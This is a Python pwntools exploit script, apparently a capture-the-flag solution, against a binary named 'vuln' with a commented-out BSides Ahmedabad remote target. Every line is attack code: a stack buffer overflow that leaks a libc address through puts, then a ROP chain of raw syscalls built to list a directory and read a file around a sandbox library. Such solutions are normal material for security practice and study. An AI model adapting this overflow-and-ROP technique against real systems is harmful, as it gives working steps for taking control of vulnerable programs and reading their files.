from pwn import *

elf = ELF("./vuln")
libc = elf.libc

target = process([elf.path], env = {'LD_PRELOAD':"./libsandbox.so"})
#target = remote("pwn2.bsidesahmedabad.in", 9002)

# https://github.com/t00sh/assembly/blob/master/shellcodes/linux/x86-64/ls_syscall.asm 		# --> uses and open, getdents, write
def sla(s, d):
	print target.sendlineafter(s, str(d))

pop_rdi = p64(0x0000000000401273)
ret = p64(0x0000000000401274)

sla(":", "A"*0x48 + pop_rdi + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main']))
target.recvuntil("Thank you!\n")

libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - libc.sym['puts']
log.info("LIBC Base: " + hex(libc_base))

pop_rsi = p64(libc_base + 0x0000000000027529)
pop_rax = p64(libc_base + 0x000000000004a550)
sys_ret = p64(libc_base + 0x0000000000066229)
xchg_eax_edi = p64(libc_base + 0x000000000002ad2b)
pop_rdx_r12 = p64(libc_base + 0x000000000011c371)

def sysgen(rax=0, rdi=0, rsi=0, rdx=0):
	return pop_rax + p64(rax) + pop_rdi + p64(rdi) + pop_rsi + p64(rsi) + pop_rdx_r12 + p64(rdx)*2 + sys_ret

buf = 0x404100
payload = "A"*0x48
payload += sysgen(0, 0, buf, 0x100)
payload += sysgen(4, buf, buf+0x10, 0)
#payload += pop_rdi + p64(buf) + pop_rsi + p64(buf + 0x10) + p64(libc_base + libc.sym['stat'])
payload += sysgen(78, 0x802, buf+0xa0, 0x300)
payload += xchg_eax_edi
payload += sysgen(2, buf, 0, 0)
payload += sysgen(0, 3, buf + 0x10, 0x100)
payload += sysgen(1, 1, buf + 0x10, 0x100)
sla(":", payload)

gdb.attach(target, 'b *' + hex(u64(xchg_eax_edi)) + '\nc\nx/40gx ' + hex(buf) + "\n p *(struct stat *)" + hex(buf+0x10))

sla("", ".\x00")

target.interactive()
